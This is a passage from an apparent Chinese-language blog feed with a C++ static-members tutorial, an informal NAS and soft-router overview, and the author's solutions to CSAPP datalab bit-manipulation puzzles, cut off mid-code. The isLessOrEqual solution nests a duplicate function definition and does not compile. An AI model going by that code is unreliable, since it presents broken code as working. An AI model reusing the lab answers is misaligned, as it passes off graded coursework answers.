    <content type="html"><![CDATA[<p><a href="https://www.tutorialspoint.com/cplusplus/cpp_static_members.htm#:~:text=By%20declaring%20a%20function%20member,the%20scope%20resolution%20operator%20%3A%3A.">原文</a></p><h2 id="static-menmbers-of-a-c-class"><a href="#static-menmbers-of-a-c-class" class="headerlink" title="static menmbers of a c++ class"></a>static menmbers of a c++ class</h2><p>当我们声明一个类成员为static的时候，这意味着无论有其他多少种类的对象被创建了，也仅有这一份静态成员的copy。</p><p>静态成员也被类的所有对象共享。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++">Live Demo<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br> <br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Box</span> &#123;</span><br>   <span class="hljs-keyword">public</span>:<br>      <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> objectCount;<br>      <br>      <span class="hljs-comment">// Constructor definition</span><br>      <span class="hljs-built_in">Box</span>(<span class="hljs-keyword">double</span> l = <span class="hljs-number">2.0</span>, <span class="hljs-keyword">double</span> b = <span class="hljs-number">2.0</span>, <span class="hljs-keyword">double</span> h = <span class="hljs-number">2.0</span>) &#123;<br>         cout &lt;&lt;<span class="hljs-string">&quot;Constructor called.&quot;</span> &lt;&lt; endl;<br>         length = l;<br>         breadth = b;<br>         height = h;<br>         <br>         <span class="hljs-comment">// Increase every time object is created</span><br>         objectCount++;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">Volume</span><span class="hljs-params">()</span> </span>&#123;<br>         <span class="hljs-keyword">return</span> length * breadth * height;<br>      &#125;<br>      <br>   <span class="hljs-keyword">private</span>:<br>      <span class="hljs-keyword">double</span> length;     <span class="hljs-comment">// Length of a box</span><br>      <span class="hljs-keyword">double</span> breadth;    <span class="hljs-comment">// Breadth of a box</span><br>      <span class="hljs-keyword">double</span> height;     <span class="hljs-comment">// Height of a box</span><br>&#125;;<br><br><span class="hljs-comment">// Initialize static member of class Box</span><br><span class="hljs-keyword">int</span> Box::objectCount = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>   <span class="hljs-function">Box <span class="hljs-title">Box1</span><span class="hljs-params">(<span class="hljs-number">3.3</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">1.5</span>)</span></span>;    <span class="hljs-comment">// Declare box1</span><br>   <span class="hljs-function">Box <span class="hljs-title">Box2</span><span class="hljs-params">(<span class="hljs-number">8.5</span>, <span class="hljs-number">6.0</span>, <span class="hljs-number">2.0</span>)</span></span>;    <span class="hljs-comment">// Declare box2</span><br><br>   <span class="hljs-comment">// Print total number of objects.</span><br>   cout &lt;&lt; <span class="hljs-string">&quot;Total objects: &quot;</span> &lt;&lt; Box::objectCount &lt;&lt; endl;<br><br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">Constructor called.<br>Constructor called.<br>Total objects: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="static-function-members"><a href="#static-function-members" class="headerlink" title="static function members"></a>static function members</h2><p>声明一个静态成员函数，这将会让它独立于类的所有对象。</p><p>静态成员函数只能访问静态数据成员，其他静态成员函数和类外所有函数。</p><blockquote><p>Static member functions have a class scope and they do not have access to the <strong>this</strong> pointer of the class. You could use a static member function to determine whether some objects of the class have been created or not.</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br> <br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Box</span> &#123;</span><br>   <span class="hljs-keyword">public</span>:<br>      <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> objectCount;<br>      <br>      <span class="hljs-comment">// Constructor definition</span><br>      <span class="hljs-built_in">Box</span>(<span class="hljs-keyword">double</span> l = <span class="hljs-number">2.0</span>, <span class="hljs-keyword">double</span> b = <span class="hljs-number">2.0</span>, <span class="hljs-keyword">double</span> h = <span class="hljs-number">2.0</span>) &#123;<br>         cout &lt;&lt;<span class="hljs-string">&quot;Constructor called.&quot;</span> &lt;&lt; endl;<br>         length = l;<br>         breadth = b;<br>         height = h;<br><br>         <span class="hljs-comment">// Increase every time object is created</span><br>         objectCount++;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">Volume</span><span class="hljs-params">()</span> </span>&#123;<br>         <span class="hljs-keyword">return</span> length * breadth * height;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getCount</span><span class="hljs-params">()</span> </span>&#123;<br>         <span class="hljs-keyword">return</span> objectCount;<br>      &#125;<br>      <br>   <span class="hljs-keyword">private</span>:<br>      <span class="hljs-keyword">double</span> length;     <span class="hljs-comment">// Length of a box</span><br>      <span class="hljs-keyword">double</span> breadth;    <span class="hljs-comment">// Breadth of a box</span><br>      <span class="hljs-keyword">double</span> height;     <span class="hljs-comment">// Height of a box</span><br>&#125;;<br><br><span class="hljs-comment">// Initialize static member of class Box</span><br><span class="hljs-keyword">int</span> Box::objectCount = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>   <span class="hljs-comment">// Print total number of objects before creating object.</span><br>   cout &lt;&lt; <span class="hljs-string">&quot;Inital Stage Count: &quot;</span> &lt;&lt; Box::<span class="hljs-built_in">getCount</span>() &lt;&lt; endl;<br><br>   <span class="hljs-function">Box <span class="hljs-title">Box1</span><span class="hljs-params">(<span class="hljs-number">3.3</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">1.5</span>)</span></span>;    <span class="hljs-comment">// Declare box1</span><br>   <span class="hljs-function">Box <span class="hljs-title">Box2</span><span class="hljs-params">(<span class="hljs-number">8.5</span>, <span class="hljs-number">6.0</span>, <span class="hljs-number">2.0</span>)</span></span>;    <span class="hljs-comment">// Declare box2</span><br><br>   <span class="hljs-comment">// Print total number of objects after creating object.</span><br>   cout &lt;&lt; <span class="hljs-string">&quot;Final Stage Count: &quot;</span> &lt;&lt; Box::<span class="hljs-built_in">getCount</span>() &lt;&lt; endl;<br><br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">Inital Stage Count: <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">Constructor</span> <span class="hljs-title">called</span>.</span><br><span class="hljs-function"><span class="hljs-title">Constructor</span> <span class="hljs-title">called</span>.</span><br><span class="hljs-function"><span class="hljs-title">Final</span> <span class="hljs-title">Stage</span> <span class="hljs-title">Count</span>:</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>简要介绍一下nas和软路由</title>
    <link href="/2020/08/26/%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8Bnas%E5%92%8C%E8%BD%AF%E8%B7%AF%E7%94%B1/"/>
    <url>/2020/08/26/%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8Bnas%E5%92%8C%E8%BD%AF%E8%B7%AF%E7%94%B1/</url>
    
    <content type="html"><![CDATA[<h2 id="nas和软路由作用"><a href="#nas和软路由作用" class="headerlink" title="nas和软路由作用"></a>nas和软路由作用</h2><p>对于普通人来说，nas的最大作用就是备份系统（全系统备份）以及作为外部存储空间来使用了，其次就是远程访问nas中的电影/剧，还有方便的共享文件和云协作、挂着下载bt/pt了。一般局域网访问有110M/s的速度，2.5G也有250M/s上下的速度，只要不是视频制作者和单反使用者，这应该很足够使用。</p><p>nas如果有视频输出接口，或者家庭用的智能电视，也可以通过安装软件，自动扫描硬盘上的电影资源，自动获取展示海报等，作为家庭影音中心。</p><p>而软路由，除了作为起飞地点之外，还可以流控，还可以玩高端路由器才玩得起的东西（因为我也没咋玩过hhh）。软路由可以在nas里起一个虚拟机/docker就能玩，这样更加方便了。</p><h2 id="nas的几大系统和软硬结合厂商"><a href="#nas的几大系统和软硬结合厂商" class="headerlink" title="nas的几大系统和软硬结合厂商"></a>nas的几大系统和软硬结合厂商</h2><h3 id="群晖（整机）"><a href="#群晖（整机）" class="headerlink" title="群晖（整机）"></a>群晖（整机）</h3><p>最先要说的当然是群晖，贵，可能是我的缺点，易上手，这是真的好，ui还不错，个人感觉偏向ubuntu系统风格，配备的软件也很齐全，比如windwos/linux都可以通过自家的软件来实现定时备份。还有庞大的插件市场可以玩耍，但在手机上，app多，功能重叠也是一大问题。</p><p>但是黑群晖就好玩了，近几年的x86都可以刷上黑群晖玩耍，除了硬件转码和他们自家的内网穿透需要白群晖认证（穿透不建议白嫖），大体功能是没有什么问题的。找好引导，刷在u盘上，往电脑一插然后刷入基础系统，就可以通过他们家的在线安装dsm系统了（不过还是建议选择网上给的dsm系统）</p><p>至于阵列我就不多说了，群晖有个SHR阵列，这个比较建议多个盘相同容量。2T * 2的情况下会有2T专门用来冗余和数据保护，而2T * 3， *4甚至 *5的情况下，还是只用2T来用于数据保护，坏了一个盘数据也完全没有问题。 </p><h3 id="freenas（系统）"><a href="#freenas（系统）" class="headerlink" title="freenas（系统）"></a>freenas（系统）</h3><p>安装可能硬核一点，但支持广。freenas 自带的zfs系统挺有意思的，会在写入数据的时候放在一块新的空间里，写完之后才更新数据指向，这样自然而然可以拥有快照功能，还带有数据校验等功能。界面有web管理后台的感觉hhh，数据展示比较多比较炫酷，汉化有但还不是完全汉化。</p><h3 id="威联通（整机）"><a href="#威联通（整机）" class="headerlink" title="威联通（整机）"></a>威联通（整机）</h3><p>系统ui比群晖还要高级好看一点，但是系统设置方面跟贴近于硬核玩家的使用习惯hhhh，比群晖便宜点但也便宜不到哪去（扶额）</p><h3 id="unraid（系统）"><a href="#unraid（系统）" class="headerlink" title="unraid（系统）"></a>unraid（系统）</h3><p>了解不多。。。</p><h3 id="openmediavautl（系统）"><a href="#openmediavautl（系统）" class="headerlink" title="openmediavautl（系统）"></a>openmediavautl（系统）</h3><p>了解不多。。。</p><p>我研究的还是黑群晖比较多一点，毕竟比较方便，加上我看的教程视频，折腾的也是黑群晖，稍微了解了一点别的就拍板折腾黑群晖了。因为宿舍经常定时断电（半个月电费用完必断一次电才去充钱），为了保护宝贵的硬盘们还有我的电脑，又花了点点钱买了个ups玩玩（折腾永无止境hhh）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP lab</title>
    <link href="/2020/08/22/CSAPP%20lab/"/>
    <url>/2020/08/22/CSAPP%20lab/</url>
    
    <content type="html"><![CDATA[<h2 id="datalab"><a href="#datalab" class="headerlink" title="datalab"></a>datalab</h2><p>正数用<strong>原码</strong>表示的，负数用<strong>补码</strong>表示</p><blockquote><p>补码：正数的补码就是其原码；<strong>负数的反码+1</strong>就是补码</p><p>如单字节5，在计算机中就表示为：0000 0101。负数用补码表示，如单字节-5，在计算机中表示为1111 1011。</p></blockquote><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">allOddBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> ALL_A = <span class="hljs-number">0xAAAAAAAA</span>;<span class="hljs-comment">//10101010101010101010101010101010</span><br>  <span class="hljs-keyword">return</span> !((x &amp; ALL_A) ^ ALL_A);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-comment">// x &gt; 0x30 &amp;&amp; x &lt; 0x39</span><br>  <span class="hljs-keyword">int</span> TMIN = <span class="hljs-number">0x80000000</span>; <span class="hljs-comment">// 10000000000000000000000000000000</span><br>  <span class="hljs-keyword">int</span> minus0x30 = ~<span class="hljs-number">0x30</span> + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> !((x + minus0x30) &amp; TMIN) <span class="hljs-comment">// x - 0x30 &gt; 0</span><br>    &amp;&amp; !((<span class="hljs-number">0x39</span> - x) &amp; TMIN); <span class="hljs-comment">// 0x39 - x &gt; 0</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="conditional-x-y-z"><a href="#conditional-x-y-z" class="headerlink" title="conditional x ? y : z"></a>conditional x ? y : z</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(3,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">conditional</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y, <span class="hljs-keyword">int</span> z)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> x1 = !!x;<span class="hljs-comment">//if x==0, x1 = 1 else x1 = 0</span><br>  x = ~x1+<span class="hljs-number">1</span>;<span class="hljs-comment">//if x1 == 1, x = 111111111...11 else x =0</span><br>  <span class="hljs-keyword">return</span> (x&amp;y)|(~x&amp;z);<br>  <span class="hljs-comment">//if x =11111... 1111 ,(x &amp; y) = y,( ~x &amp; z) = 0</span><br><span class="hljs-comment">//if x = 0 , (x &amp; γ〕 = 0, (~x &amp; z) = z</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> diff_sign = ((x &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>)         <span class="hljs-comment">// x &lt; 0</span><br>                  &amp; (((y &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>) ^ <span class="hljs-number">1</span>);<span class="hljs-comment">// y &gt; 0</span><br>  <span class="hljs-keyword">int</span> same_sign = (((x &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>)        <span class="hljs-comment">// same equals 1</span><br>                  ^ ((y &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>) ^ <span class="hljs-number">1</span>); <span class="hljs-comment">// not the same euqals 0</span><br>  <span class="hljs-keyword">int</span> x_minus_y = (((x + (~y)) &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> diff_sign || ( same_sign &amp;&amp; x_minus_y);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h4><p>x &lt;= y 的条件等价于</p><ul><li><p>x，y异号。<code>sign(x) == 1 &amp;&amp; sing(y) == 0</code>，即<code>sign(x) &amp; (sign(y) ^ 1)</code></p><blockquote><p>Sign(x) {</p><p>​    return ((x &gt;&gt; 31) &amp; 1); // 逻辑位移，详见下</p><p>}</p><p>如果为负数，返回1</p><p>正数，返回0</p></blockquote></li><li><p>x，y同号。</p></li></ul><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">1</span>.<span class="hljs-built_in">sign</span>(x) == <span class="hljs-built_in">sign</span>(y) =&gt; (<span class="hljs-built_in">sign</span>(x) ^ <span class="hljs-built_in">sign</span>(y) ^ <span class="hljs-number">1</span>)<br><span class="hljs-number">2</span>.x - y &lt;= <span class="hljs-number">0</span><br>=&gt; x - y &lt; <span class="hljs-number">1</span><br>=&gt; x + (~y+<span class="hljs-number">1</span>) &lt; <span class="hljs-number">1</span><br>=&gt; x + (~y) &lt; <span class="hljs-number">1</span><br>=&gt; <span class="hljs-built_in">sign</span>(x + (~y))<br></code></pre></td></tr></table></figure><blockquote><p><a href="https://www.cnblogs.com/sinkinben/p/12323784.html">来源&amp;参考-最大数值</a></p></blockquote><h4 id="逻辑位移算数位移"><a href="#逻辑位移算数位移" class="headerlink" title="逻辑位移算数位移"></a>逻辑位移算数位移</h4><p>逻辑右移只将二进制数整体右移，<strong>左边补0</strong>，屏蔽了右移带出来的符号位</p><p>算术位移，左边补上符号位。</p><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><blockquote><p>当 x≠0x≠0 时，x|(−x)x|(−x) 的符号位必然为 1</p><p><a href="https://mcginn7.github.io/2020/02/14/CSAPP-datalab/#isLessOrEqual-x-y">来源</a></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of </span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalNeg</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> ((x | (~x + <span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5</span><br><span class="hljs-comment"> *            howManyBits(298) = 10</span><br><span class="hljs-comment"> *            howManyBits(-5) = 4</span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">howManyBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> b16,b8,b4,b2,b1,b0;<br>  <span class="hljs-keyword">int</span> sign=x&gt;&gt;<span class="hljs-number">31</span>;<br>  x = (sign&amp;~x)|(~sign&amp;x);<span class="hljs-comment">//如果x&gt;0, 则x = x, 否则x = ~x</span><br>  <br>  b16 = !!(x&gt;&gt;<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">4</span>;<span class="hljs-comment">//高十六位有1，则b16 = 2^4 = 16, 否则b16 = 0</span><br>  x = x&gt;&gt;b16;<br>  b8 = !!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;<br>  x = x&gt;&gt;b8;<br>  b4 = !!(x&gt;&gt;<span class="hljs-number">4</span>)&lt;&lt;<span class="hljs-number">2</span>;<br>  x = x&gt;&gt;b4;<br>  b2 = !!(x&gt;&gt;<span class="hljs-number">2</span>)&lt;&lt;<span class="hljs-number">1</span>;<br>  x = x&gt;&gt;b2;<br>  b1 = !!(x&gt;&gt;<span class="hljs-number">1</span>);<br>  x = x&gt;&gt;b1;<br>  b0 = x;<br>  <span class="hljs-keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="hljs-number">1</span>;<span class="hljs-comment">//+1表示加上符号位</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">floatScale2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> exp_const = <span class="hljs-number">0x7f800000</span>; <span class="hljs-comment">// 01111111100000000000000000000000</span><br>    <span class="hljs-keyword">int</span> frac_const = <span 